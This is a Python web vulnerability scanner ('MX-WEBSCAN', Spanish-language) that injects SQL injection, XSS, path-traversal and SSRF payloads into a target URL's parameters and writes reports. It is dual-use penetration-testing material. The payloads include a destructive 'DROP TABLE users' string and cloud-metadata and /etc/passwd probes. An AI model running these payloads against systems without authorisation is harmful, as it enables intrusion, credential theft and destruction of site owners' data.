#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MX-WEBSCAN - Escáner de vulnerabilidades web OWASP Top 10
Author: Falconmx1 | GitHub: https://github.com/Falconmx1/MX-WEBSCAN
"""

import requests
import argparse
import json
import time
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# Banner épico
def show_banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║  ███╗   ███╗██╗  ██╗    ██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
    ║  ████╗ ████║╚██╗██╔╝    ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
    ║  ██╔████╔██║ ╚███╔╝     ██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║
    ║  ██║╚██╔╝██║ ██╔██╗     ██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║
    ║  ██║ ╚═╝ ██║██╔╝ ██╗    ╚███╔███╔╝███████╗██║  ██║███████║╚██████╗██║  ██║██║ ╚████║
    ║  ╚═╝     ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    ║                                                                      v2.0 🔥    ║
    ║         Escáner Automatizado OWASP Top 10 - by Falconmx1 🇲🇽                    ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
    """ + Fore.YELLOW + "[!] Uso ético y legal. Solo probar sistemas con autorización.\n" + Style.RESET_ALL)

class MXScanner:
    def __init__(self, url, proxy=None, headers=None, timeout=5):
        self.target = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'MX-WEBSCAN/2.0 (Security Scanner)'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        if headers:
            self.session.headers.update(headers)
        self.vulnerabilities = []
        
    def extract_params(self):
        """Extrae parámetros de la URL"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        if params:
            return {k: v[0] for k, v in params.items()}
        return {}
    
    def test_sqli(self, url, param, original_value):
        """Prueba de SQL Injection"""
        payloads = [
            ("' OR '1'='1", "Error SQL o bypass"),
            ("' OR SLEEP(5)--", "Time-based"),
            ("' UNION SELECT NULL--", "Union-based"),
            ("1 AND 1=1", "Boolean"),
            ("'; DROP TABLE users--", "Blind SQL")
        ]
        
        for payload, technique in payloads:
            try:
                test_url = url.replace(f"={original_value}", f"={payload}")
                start = time.time()
                response = self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start
                
                if elapsed > 4.5 or any(err in response.text.lower() for err in ['sql', 'mysql', 'syntax', 'mariadb', 'postgresql']):
                    return {
                        'type': 'SQL Injection (SQLi)',
                        'parameter': param,
                        'payload': payload,
                        'technique': technique,
                        'evidence': f'Tiempo: {elapsed:.2f}s' if elapsed > 4.5 else 'Error SQL en respuesta',
                        'risk': 'Crítica'
                    }
            except:
                continue
        return None
    
    def test_xss(self, url, param, original_value):
        """Prueba de Cross-Site Scripting"""
        payloads = [
            "<script>alert('MX-WEBSCAN')</script>",
            '"><img src=x onerror=alert(1)>',
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')",
            "<body onload=alert(1)>"
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace(f"={original_value}", f"={payload}")
                response = self.session.get(test_url, timeout=self.timeout)
                
                if payload in response.text and not self._is_escaped(payload, response.text):
                    return {
                        'type': 'Cross-Site Scripting (XSS)',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Payload reflejado sin sanitizar',
                        'risk': 'Alta'
                    }
            except:
                continue
        return None
    
    def test_lfi(self, url, param, original_value):
        """Prueba de Local File Inclusion"""
        payloads = [
            "../../../etc/passwd",
            "..\\windows\\win.ini",
            "%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "../../../../../../../../etc/passwd"
        ]
        
        keywords = ['root:', '[extensions]', 'daemon:', 'bin/bash', 'mysql', 'www-data']
        
        for payload in payloads:
            try:
                test_url = url.replace(f"={original_value}", f"={payload}")
                response = self.session.get(test_url, timeout=self.timeout)
                
                if any(keyword in response.text.lower() for keyword in keywords):
                    return {
                        'type': 'Local File Inclusion (LFI)',
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Archivo del sistema detectado: {payload}',
                        'risk': 'Alta'
                    }
            except:
                continue
        return None
    
    def test_ssrf(self, url, param, original_value):
        """Prueba de Server-Side Request Forgery"""
        internal_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/admin",
            "http://127.0.0.1/config",
            "file:///etc/passwd",
            "http://metadata.google.internal/"
        ]
        
        for target in internal_targets:
            try:
                test_url = url.replace(f"={original_value}", f"={target}")
                response = self.session.get(test_url, timeout=self.timeout)
                
                if any(internal in response.text.lower() for internal in ['aws', 'localhost', 'root:', 'admin', 'metadata']):
                    return {
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'parameter': param,
                        'payload': target,
                        'evidence': 'Acceso a recurso interno detectado',
                        'risk': 'Alta'
                    }
            except:
                continue
        return None
    
    def _is_escaped(self, payload, text):
        """Verifica si el payload fue escapado por WAF"""
        escaped = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        return escaped in text
    
    def scan(self):
        """Ejecuta el escaneo completo"""
        params = self.extract_params()
        
        if not params:
            print(Fore.RED + "\n[✗] No se encontraron parámetros en la URL")
            print(Fore.YELLOW + "[!] Ejemplo de uso: python mx-webscan.py -u 'http://sitio.com/page.php?id=1'")
            return
        
        print(Fore.GREEN + f"\n[+] Parámetros detectados: {', '.join(params.keys())}")
        print(Fore.CYAN + "[*] Iniciando pruebas de vulnerabilidad...\n")
        
        for param, value in params.items():
            print(Fore.WHITE + f"[→] Analizando: {param} = {value}")
            
            parsed = urlparse(self.target)
            query_params = parse_qs(parsed.query)
            query_params[param] = ["TEST_VALUE"]
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            tests = [
                ('SQLi', self.test_sqli),
                ('XSS', self.test_xss),
                ('LFI', self.test_lfi),
                ('SSRF', self.test_ssrf)
            ]
            
            for vuln_name, test_func in tests:
                result = test_func(test_url, param, "TEST_VALUE")
                if result:
                    self.vulnerabilities.append(result)
                    print(Fore.RED + f"  ⚠️  {vuln_name} encontrado!")
    
    def generate_report(self):
        """Genera reporte TXT y JSON"""
        if not self.vulnerabilities:
            print(Fore.GREEN + "\n[✓] No se encontraron vulnerabilidades. ¡Sitio seguro en estos parámetros!")
            return
        
        os.makedirs("reports", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Reporte TXT
        txt_path = f"reports/mxwebscan_{timestamp}.txt"
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write(f"MX-WEBSCAN Report - {timestamp}\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Total Vulnerabilities: {len(self.vulnerabilities)}\n")
            f.write("="*60 + "\n\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"{i}. {vuln['type']} [{vuln['risk']}]\n")
                f.write(f"   Parameter: {vuln['parameter']}\n")
                f.write(f"   Payload: {vuln['payload']}\n")
                f.write(f"   Evidence: {vuln['evidence']}\n")
                f.write(f"   Technique: {vuln.get('technique', 'N/A')}\n")
                f.write("-"*40 + "\n")
        
        # Reporte JSON
        json_path = f"reports/mxwebscan_{timestamp}.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump({
                'target': self.target,
                'timestamp': timestamp,
                'total': len(self.vulnerabilities),
                'findings': self.vulnerabilities
            }, f, indent=2)
        
        print(Fore.GREEN + f"\n[✓] Reportes guardados en /reports/")
        print(Fore.GREEN + f"    - {txt_path}")
        print(Fore.GREEN + f"    - {json_path}")

def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description='MX-WEBSCAN - OWASP Top 10 Scanner')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo (ej: http://testphp.vulnweb.com/artists.php?artist=1)')
    parser.add_argument('--proxy', help='Proxy HTTP (ej: http://127.0.0.1:8080)')
    parser.add_argument('--header', action='append', help='Headers personalizados (ej: --header "Auth: token")')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout en segundos (default: 5)')
    
    args = parser.parse_args()
    
    headers = {}
    if args.header:
        for h in args.header:
            if ': ' in h:
                key, value = h.split(': ', 1)
                headers[key] = value
    
    scanner = MXScanner(args.url, args.proxy, headers, args.timeout)
    scanner.scan()
    scanner.generate_report()
    
    print(Fore.CYAN + "\n[+] Escaneo completado. ¡Gracias por usar MX-WEBSCAN! 🔐\n")

if __name__ == "__main__":
    main()
